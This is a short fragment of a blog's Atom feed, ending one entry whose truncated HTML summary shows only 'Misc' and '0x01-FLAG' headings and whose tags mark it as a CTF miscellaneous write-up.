        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;0x01-FLAG&quot;&gt;&lt;a href=&quot;#0x01-FLAG&quot; 
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Misc" scheme="http://yoursite.com/tags/Misc/"/>
    
  </entry>
  
</feed>
